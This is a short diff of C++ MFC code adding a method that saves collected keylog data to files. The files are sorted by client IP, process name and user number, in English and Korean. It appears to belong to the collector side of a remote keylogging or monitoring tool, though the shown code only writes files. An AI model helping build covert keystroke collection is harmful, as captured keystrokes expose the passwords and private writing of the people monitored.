@@ -135,3 +135,45 @@ void CClientKeylog::OnVscrollEditClientKeylog()
 {
 	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
 }
+
+/* 키로그 데이터를 파일로 저장(단위 : 프로세스) */
+void CClientKeylog::SaveKeylog(CString IP, int userNo)
+{
+	// TODO: 여기에 구현 코드 추가
+	CString str;
+	CStringA strA;
+
+	TCHAR currentDir[MAX_PATH];
+	GetCurrentDirectory(MAX_PATH, currentDir);
+
+	CFileException eex;
+	CFile logfileEn, logfileKo;
+
+	// (현재 디렉터리)/keylogs/[타임스탬프값] 폴더를 생성. 굳이굳이 2번 만들어야함
+	CString FileDirectory = currentDir;
+	FileDirectory.Format(TEXT("%s%s"), currentDir, TEXT("\\keylogs\\"));
+	CreateDirectory(FileDirectory, NULL);
+	FileDirectory.Format(TEXT("%s%d"), FileDirectory.GetBuffer(), CTime::GetCurrentTime().GetTime());
+	CreateDirectory(FileDirectory, NULL);
+
+	str.Format(TEXT("%d"), userNo);
+	if (!logfileEn.Open(FileDirectory + TEXT("\\[") + IP + TEXT("]") + process_name + TEXT("(en)#") + str + TEXT(".txt"),
+		CFile::modeWrite | CFile::modeCreate | CFile::shareExclusive | CFile::typeBinary, &eex))
+	{
+		eex.ReportError();
+		return;
+	}
+	if (!logfileKo.Open(FileDirectory + TEXT("\\[") + IP + TEXT("]") + process_name + TEXT("(ko)#") + str + TEXT(".txt"),
+		CFile::modeWrite | CFile::modeCreate | CFile::shareExclusive | CFile::typeBinary, &eex))
+	{
+		eex.ReportError();
+		return;
+	}
+	strA = m_client_keylog;
+	logfileEn.Write(strA.GetBuffer(), strA.GetAllocLength());
+	strA = m_client_keylog_ko;
+	logfileKo.Write(strA.GetBuffer(), strA.GetAllocLength());
+
+	logfileEn.Close();
+	logfileKo.Close();
+}
